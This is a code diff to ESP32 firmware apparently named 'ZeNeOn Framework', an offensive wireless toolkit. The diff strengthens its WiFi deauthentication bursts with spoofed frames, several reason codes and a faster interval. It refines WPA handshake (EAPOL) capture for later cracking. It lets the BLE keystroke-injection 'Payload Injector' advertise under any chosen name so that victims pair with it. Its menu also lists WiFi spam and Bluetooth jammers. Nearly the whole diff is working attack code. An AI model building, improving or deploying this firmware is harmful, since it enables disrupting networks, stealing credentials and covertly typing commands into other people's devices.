@@ -46,6 +46,7 @@ uint32_t totalPacketsCaptured = 0;
 uint8_t eapolFramesDetected = 0;
 
 /* ============ PAYLOAD INJECTOR (BLE HID KEYBOARD) ============ */
+String bleDeviceName = "ZeNeOn";  // user-configurable BLE device name
 BleKeyboard bleKeyboard("ZeNeOn", "ZeNeOn Framework", 100);
 bool bleKbStarted = false;        // user-facing "active" flag
 bool bleNimbleReady = false;      // true after first bleKeyboard.begin() — never end() after this
@@ -103,9 +104,9 @@ uint16_t assocFrameCount = 0;
 uint8_t deauthCycles = 0;
 
 // Phase timing (milliseconds)
-const unsigned long PRE_CAPTURE_MS = 4000;  // 4s beacon capture
-const unsigned long DEAUTH_BURST_MS = 4000; // 4s aggressive deauth burst
-const unsigned long LISTEN_MS = 8000;       // 8s listen for handshake
+const unsigned long PRE_CAPTURE_MS = 5000;  // 5s beacon capture
+const unsigned long DEAUTH_BURST_MS = 5000; // 5s aggressive deauth burst
+const unsigned long LISTEN_MS = 12000;      // 12s listen for handshake (clients need time to reconnect)
 
 File pcapFile;
 String targetSSID = "";
@@ -307,7 +308,7 @@ String homeUI() {
 <button class="secondary" onclick="location.href='/spamui'">WiFi Spam</button>
 <button class="secondary" onclick="location.href='/btjamui'">BLE Jammer</button>
 <button class="secondary" onclick="location.href='/nrfjamui'">BT Jammer (nRF24)</button>
-<button class="secondary" onclick="location.href='/payloadui'">⌨ Payload Injector (BLE)</button>
+<button class="secondary" onclick="location.href='/payloadui'">Payload Injector (BLE)</button>
 </div>
 <div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
@@ -1016,45 +1017,109 @@ body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify
 }
 
 /* ============ EAPOL / HANDSHAKE ============ */
+// Calculate 802.11 data frame header length (handles QoS, 4-addr, HT Control)
+int getDataHeaderLen(const uint8_t *payload, uint32_t len) {
+  if (len < 24) return 24;
+  int hdrLen = 24; // base: FC(2) + Dur(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtl(2)
+
+  // 4-address frame (To DS=1 AND From DS=1) — adds Addr4 (6 bytes)
+  if ((payload[1] & 0x03) == 0x03) {
+    hdrLen += 6;
+  }
+
+  // QoS data frame: subtype bit 3 set (subtypes 0x08..0x0F) — adds 2 bytes
+  uint8_t subtype = (payload[0] >> 4) & 0x0F;
+  if (subtype & 0x08) {
+    hdrLen += 2;
+  }
+
+  // HT Control field present when Order bit (byte 1, bit 7) is set — adds 4 bytes
+  if (payload[1] & 0x80) {
+    hdrLen += 4;
+  }
+
+  return hdrLen;
+}
+
 bool isEAPOLFrame(const uint8_t *payload, uint32_t len) {
-  if (len < 36)
-    return false;
-  // Check LLC/SNAP header for 802.1X Authentication (0x888E)
-  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
-      payload[30] == 0x88 && payload[31] == 0x8E)
+  if (len < 34) return false;
+  int hdrLen = getDataHeaderLen(payload, len);
+  // Need at least header + 8 bytes LLC/SNAP
+  if ((int)len < hdrLen + 8) return false;
+
+  // Primary check: LLC/SNAP header at calculated offset for 802.1X (0x888E)
+  if (payload[hdrLen] == 0xAA && payload[hdrLen + 1] == 0xAA &&
+      payload[hdrLen + 2] == 0x03 &&
+      payload[hdrLen + 6] == 0x88 && payload[hdrLen + 7] == 0x8E)
     return true;
+
+  // Fallback: scan common offsets (24, 26, 28, 30, 32) for 0x888E EtherType
+  // in case our header length calculation is off for exotic frame formats
+  static const int fallbackOffsets[] = {24, 26, 28, 30, 32};
+  for (int f = 0; f < 5; f++) {
+    int off = fallbackOffsets[f];
+    if (off == hdrLen) continue; // already checked
+    if (off + 8 > (int)len) continue;
+    if (payload[off] == 0xAA && payload[off + 1] == 0xAA &&
+        payload[off + 2] == 0x03 &&
+        payload[off + 6] == 0x88 && payload[off + 7] == 0x8E)
+      return true;
+  }
   return false;
 }
 
+// Find the LLC/SNAP 0x888E offset (used by getEAPOLMessageType)
+int findEAPOLOffset(const uint8_t *payload, uint32_t len) {
+  int hdrLen = getDataHeaderLen(payload, len);
+  if (hdrLen + 8 <= (int)len &&
+      payload[hdrLen] == 0xAA && payload[hdrLen + 1] == 0xAA &&
+      payload[hdrLen + 2] == 0x03 &&
+      payload[hdrLen + 6] == 0x88 && payload[hdrLen + 7] == 0x8E)
+    return hdrLen;
+  // Fallback scan
+  static const int fallbackOffsets[] = {24, 26, 28, 30, 32};
+  for (int f = 0; f < 5; f++) {
+    int off = fallbackOffsets[f];
+    if (off + 8 > (int)len) continue;
+    if (payload[off] == 0xAA && payload[off + 1] == 0xAA &&
+        payload[off + 2] == 0x03 &&
+        payload[off + 6] == 0x88 && payload[off + 7] == 0x8E)
+      return off;
+  }
+  return -1;
+}
+
 uint8_t getEAPOLMessageType(const uint8_t *payload, uint32_t len) {
-  if (len < 99)
-    return 0;
-  uint16_t keyInfo = (payload[37] << 8) | payload[38];
+  int llcOff = findEAPOLOffset(payload, len);
+  if (llcOff < 0) return 0;
+
+  // LLC/SNAP(8) + EAPOL hdr: version(1) + type(1) + length(2) + descriptor_type(1) = 5
+  int keyInfoOff = llcOff + 8 + 5; // offset of key_info field
+  // key_info(2) + key_length(2) + replay_counter(8) = 12 bytes to nonce
+  int nonceOff = keyInfoOff + 2 + 2 + 8;
+
+  if ((int)len < nonceOff + 32) return 0;
+
+  uint16_t keyInfo = (payload[keyInfoOff] << 8) | payload[keyInfoOff + 1];
   bool pairwise = (keyInfo & 0x0008) != 0;
-  bool install = (keyInfo & 0x0040) != 0;
-  bool ack = (keyInfo & 0x0080) != 0;
-  bool mic = (keyInfo & 0x0100) != 0;
+  bool install  = (keyInfo & 0x0040) != 0;
+  bool ack      = (keyInfo & 0x0080) != 0;
+  bool mic      = (keyInfo & 0x0100) != 0;
+
   if (pairwise) {
     if (ack && !mic && !install)
       return 1; // M1: AP -> STA (ANonce)
-    if (!ack && mic && !install)
-      return 2; // M2: STA -> AP (SNonce + MIC)
     if (ack && mic && install)
       return 3; // M3: AP -> STA (ANonce + MIC + Install)
     if (!ack && mic && !install) {
       // Could be M2 or M4. M4 has zero nonce.
-      // Nonce offset: 24(MAC) + 8(LLC/SNAP) + 4(EAPOL hdr) + 1(desc) +
-      // 2(key_info) + 2(key_len) + 8(replay) = 49
       bool nonceZero = true;
-      for (int i = 49; i < 81 && i < (int)len; i++) {
-        if (payload[i] != 0) {
-          nonceZero = false;
-          break;
-        }
+      for (int i = nonceOff; i < nonceOff + 32 && i < (int)len; i++) {
+        if (payload[i] != 0) { nonceZero = false; break; }
       }
       if (nonceZero)
         return 4; // M4: STA -> AP (MIC, zero nonce)
-      return 2;   // M2 again
+      return 2;   // M2: STA -> AP (SNonce + MIC)
     }
   }
   return 0;
@@ -1225,22 +1290,21 @@ void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
 
 /* ============ DEAUTH FRAME INJECTION ============ */
 void sendRawFrame(uint8_t *frame, int len) {
-  // Try STA interface first (standard for deauth injection)
-  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
-  if (result != ESP_OK) {
-    // Fallback to AP interface if STA fails
-    result = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
-    if (result != ESP_OK) {
-      static unsigned long lastErrLog = 0;
-      if (millis() - lastErrLog > 5000) {
-        Serial.printf("[ERROR] Frame TX failed on both IF: %s (0x%x)\n",
-                      esp_err_to_name(result), result);
-        addEvent("ERROR: Frame TX failed: " + String(esp_err_to_name(result)));
-        lastErrLog = millis();
-      }
+  // Send on BOTH interfaces for maximum reliability.
+  // AP interface is primary (it's on the target channel).
+  // STA interface is secondary (may also reach the target).
+  esp_err_t resAP = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+  esp_err_t resSTA = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+  if (resAP != ESP_OK && resSTA != ESP_OK) {
+    static unsigned long lastErrLog = 0;
+    if (millis() - lastErrLog > 5000) {
+      Serial.printf("[ERROR] Frame TX failed: AP=%s STA=%s\n",
+                    esp_err_to_name(resAP), esp_err_to_name(resSTA));
+      addEvent("ERROR: Frame TX failed");
+      lastErrLog = millis();
     }
   }
-  delayMicroseconds(300); // Brief gap for WiFi stack
+  delayMicroseconds(250); // Brief gap for WiFi TX buffer
 }
 
 void buildDeauthFrame(uint8_t *pkt, const uint8_t *dest, const uint8_t *src,
@@ -1267,31 +1331,37 @@ void buildDeauthFrame(uint8_t *pkt, const uint8_t *dest, const uint8_t *src,
 void sendDeauthBurst() {
   uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   uint8_t pkt[26];
-  uint16_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};
+  // Effective reason codes: 1=unspecified, 2=auth_invalid, 4=inactivity,
+  // 6=class2_from_nonauth, 7=class3_from_nonassoc
+  uint16_t reasons[] = {0x01, 0x02, 0x04, 0x06, 0x07};
+  int nReasons = 5;
 
-  // Broadcast deauth from AP
-  for (int r = 0; r < 3; r++) {
-    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
-                     reasons[r]);
+  // === Broadcast deauth from AP (multiple reasons) ===
+  for (int r = 0; r < nReasons; r++) {
+    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0, reasons[r]);
     sendRawFrame(pkt, 26);
     deauthPktsSent++;
   }
-  // Broadcast disassoc
+  // Broadcast disassoc from AP
   buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xA0, 0x08);
   sendRawFrame(pkt, 26);
   deauthPktsSent++;
 
-  // Targeted unicast to discovered clients
+  // === Targeted unicast to discovered clients ===
   for (int i = 0; i < clientCount; i++) {
-    // Deauth: AP -> Client
+    // Deauth: AP -> Client (reason 7: class3 from nonassoc - most effective)
     buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xC0, 0x07);
+    sendRawFrame(pkt, 26);
+    deauthPktsSent++;
+    // Deauth: AP -> Client (reason 1: unspecified)
+    buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xC0, 0x01);
     sendRawFrame(pkt, 26);
     deauthPktsSent++;
     // Disassoc: AP -> Client
     buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xA0, 0x08);
     sendRawFrame(pkt, 26);
     deauthPktsSent++;
-    // Deauth: Client -> AP (spoofed)
+    // Deauth: Client -> AP (spoofed, reason 3: STA leaving)
     buildDeauthFrame(pkt, targetBSSID, clientMACs[i], targetBSSID, 0xC0, 0x03);
     sendRawFrame(pkt, 26);
     deauthPktsSent++;
@@ -1301,13 +1371,14 @@ void sendDeauthBurst() {
     deauthPktsSent++;
   }
 
-  // More broadcast with different reasons
-  for (int r = 3; r < 7; r++) {
-    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
-                     reasons[r]);
-    sendRawFrame(pkt, 26);
-    deauthPktsSent++;
-  }
+  // === Additional broadcast deauth + disassoc at the end ===
+  buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0, 0x07);
+  sendRawFrame(pkt, 26);
+  deauthPktsSent++;
+  buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xA0, 0x04);
+  sendRawFrame(pkt, 26);
+  deauthPktsSent++;
+
   yield(); // Let WiFi task breathe so TX actually goes out
 }
 
@@ -1740,10 +1811,10 @@ void stopCapture() {
 
 void enablePromiscuous() {
   esp_wifi_set_promiscuous(false);
-  delay(50);
+  delay(100);
   // Force channel to target (SoftAP should already be on this channel)
   esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
-  delay(50);
+  delay(100);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
   wifi_promiscuous_filter_t filter;
@@ -1751,23 +1822,28 @@ void enablePromiscuous() {
                        WIFI_PROMIS_FILTER_MASK_DATA |
                        WIFI_PROMIS_FILTER_MASK_CTRL;
   esp_wifi_set_promiscuous_filter(&filter);
-  delay(50);
-  // Verify we're on the right channel
-  uint8_t verifyCh;
-  wifi_second_chan_t verifySc;
-  esp_wifi_get_channel(&verifyCh, &verifySc);
-  Serial.printf("[+] Promiscuous ON | Channel: %d (target: %d)\n", verifyCh,
-                targetChannel);
-  if (verifyCh != targetChannel) {
-    Serial.println("[!] Channel mismatch! Retrying...");
+  delay(100);
+  // Verify channel — retry up to 3 times if mismatched
+  for (int attempt = 0; attempt < 3; attempt++) {
+    uint8_t verifyCh;
+    wifi_second_chan_t verifySc;
+    esp_wifi_get_channel(&verifyCh, &verifySc);
+    if (verifyCh == targetChannel) {
+      Serial.printf("[+] Promiscuous ON | Channel: %d ✓\n", verifyCh);
+      return;
+    }
+    Serial.printf("[!] Channel mismatch: %d vs target %d — retry %d\n",
+                  verifyCh, targetChannel, attempt + 1);
     esp_wifi_set_promiscuous(false);
-    delay(100);
+    delay(150);
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
-    delay(100);
+    delay(150);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
     esp_wifi_set_promiscuous_filter(&filter);
+    delay(100);
   }
+  Serial.printf("[!] Channel set failed after retries — continuing on current channel\n");
 }
 
 String getPhaseString() {
@@ -2046,7 +2122,11 @@ String payloadInjectorUI() {
   return header() + R"rawliteral(
 <div class="card">
 <h3>Payload Injector (BLE)</h3>
-<p style="margin-bottom:10px;opacity:0.7">ESP32 acts as a Bluetooth HID keyboard. Pair the target device with <strong>"ZeNeOn"</strong> then inject C++ Keyboard payloads via BLE keystroke injection.</p>
+<p style="margin-bottom:10px;opacity:0.7">ESP32 acts as a Bluetooth HID keyboard. Set a custom device name, start BLE, pair the target device, then inject C++ Keyboard payloads via BLE keystroke injection.</p>
+<div style="margin-bottom:10px">
+<label style="font-size:12px;opacity:0.7;display:block;margin-bottom:4px">BLE Device Name (visible in Bluetooth settings)</label>
+<input type="text" id="bleName" value="ZeNeOn" maxlength="20" style="width:100%;padding:8px 12px;background:#0a0e14;border:1px solid rgba(0,100,255,0.3);border-radius:6px;color:#00ff88;font-family:'Courier New',monospace;font-size:14px;outline:none" placeholder="Enter BLE device name">
+</div>
 <div id="bleStatus" class="status">BLE Keyboard not started</div>
 <div class="grid">
 <button class="success" onclick="startBLE()" id="startBtn">Start BLE Keyboard</button>
@@ -2146,17 +2226,22 @@ var addExecLog=function(msg,color){
   d.textContent=msg; el.appendChild(d); el.scrollTop=el.scrollHeight;
 }
 var startBLE=function(){
+  var nameEl=document.getElementById('bleName');
+  var bleName=nameEl.value.trim()||'ZeNeOn';
   document.getElementById('startBtn').disabled=true;
   document.getElementById('startBtn').textContent='Starting...';
-  fetch('/payload/start').then(r=>r.json()).then(d=>{
+  nameEl.disabled=true;
+  fetch('/payload/start?name='+encodeURIComponent(bleName)).then(r=>r.json()).then(d=>{
     document.getElementById('startBtn').disabled=false;
     document.getElementById('startBtn').textContent='Start BLE Keyboard';
     if(d.ok){
+      nameEl.disabled=true;
       document.getElementById('bleStatus').className='status success';
-      document.getElementById('bleStatus').innerHTML='BLE Keyboard active — advertising as <strong>"ZeNeOn"</strong>. Pair the target device now.';
-      addExecLog('BLE Keyboard started — waiting for device to pair...','#00ff88');
+      document.getElementById('bleStatus').innerHTML='BLE Keyboard active — advertising as <strong>"'+bleName+'"</strong>. Pair the target device now.';
+      addExecLog('BLE Keyboard started as "'+bleName+'" — waiting for device to pair...','#00ff88');
       startBlePoll();
     } else {
+      nameEl.disabled=false;
       document.getElementById('bleStatus').className='status error';
       document.getElementById('bleStatus').innerHTML=d.msg;
       addExecLog('Error: '+d.msg,'#ff4444');
@@ -2164,6 +2249,7 @@ var startBLE=function(){
   }).catch(function(e){
     document.getElementById('startBtn').disabled=false;
     document.getElementById('startBtn').textContent='Start BLE Keyboard';
+    nameEl.disabled=false;
   });
 }
 var stopBLE=function(){
@@ -2172,6 +2258,7 @@ var stopBLE=function(){
   fetch('/payload/stop').then(r=>r.text()).then(d=>{
     document.getElementById('bleStatus').className='status';
     document.getElementById('bleStatus').innerHTML='BLE Keyboard stopped.';
+    document.getElementById('bleName').disabled=false;
     addExecLog('BLE Keyboard stopped','#ff4444');
   });
 }
@@ -2187,7 +2274,7 @@ var startBlePoll=function(){
         if(connPollRate!==5000){connPollRate=5000;clearInterval(blePoll);startBlePoll();return;}
       } else if(d.started){
         document.getElementById('bleStatus').className='status warning';
-        document.getElementById('bleStatus').innerHTML='Advertising as "ZeNeOn" — waiting for target device to pair...';
+        document.getElementById('bleStatus').innerHTML='Advertising as "'+document.getElementById('bleName').value.trim()+'" — waiting for target device to pair...';
         document.getElementById('execBlink').style.color='#ffaa00';
         if(connPollRate!==3500){connPollRate=3500;clearInterval(blePoll);startBlePoll();return;}
       } else {
@@ -2811,6 +2898,12 @@ void setupRoutes() {
       server.send(200, "application/json", "{\"ok\":true,\"msg\":\"Already started\"}");
       return;
     }
+    // Read custom BLE device name from query parameter
+    if (server.hasArg("name") && server.arg("name").length() > 0) {
+      bleDeviceName = server.arg("name");
+      if (bleDeviceName.length() > 20) bleDeviceName = bleDeviceName.substring(0, 20);
+    }
+    bleKeyboard.setName(bleDeviceName.c_str());
     // Cannot run BLE keyboard while BT jammer is active
     if (btJamming) {
       server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Stop BT Jammer first — both use the BLE stack\"}");
@@ -2852,7 +2945,7 @@ void setupRoutes() {
       bleKeyboard.begin();
       bleNimbleReady = true;
       delay(500);
-      Serial.println("[PAYLOAD] NimBLE initialized fresh — bonds cleared — advertising as 'ZeNeOn'");
+      Serial.printf("[PAYLOAD] NimBLE initialized fresh — bonds cleared — advertising as '%s'\n", bleDeviceName.c_str());
     } else {
       // NimBLE already running with saved bond data — DO NOT restart or clear bonds
       // Restarting clears ESP32 bonds but OS keeps old ones → key mismatch → reconnect loop
@@ -2870,7 +2963,8 @@ void setupRoutes() {
 
     Serial.printf("[PAYLOAD] BLE Keyboard activated (heap: %u)\n", ESP.getFreeHeap());
     addEvent("PAYLOAD: BLE Keyboard started");
-    server.send(200, "application/json", "{\"ok\":true,\"msg\":\"BLE Keyboard started — look for 'ZeNeOn' in Bluetooth settings\"}");
+    String startResp = "{\"ok\":true,\"msg\":\"BLE Keyboard started — look for '" + bleDeviceName + "' in Bluetooth settings\"}";
+    server.send(200, "application/json", startResp);
   });
 
   server.on("/payload/stop", []() {
@@ -3181,9 +3275,9 @@ void loop() {
   }
 
   case PHASE_DEAUTH_BURST: {
-    // Phase 2: Aggressive deauth burst at 10ms interval (same as original)
-    // This forces clients to disconnect
-    if (now - lastDeauth >= 10) {
+    // Phase 2: Aggressive deauth burst at 8ms interval
+    // Faster interval = more deauth frames = higher chance of disconnecting clients
+    if (now - lastDeauth >= 8) {
       sendDeauthBurst();
       lastDeauth = now;
     }
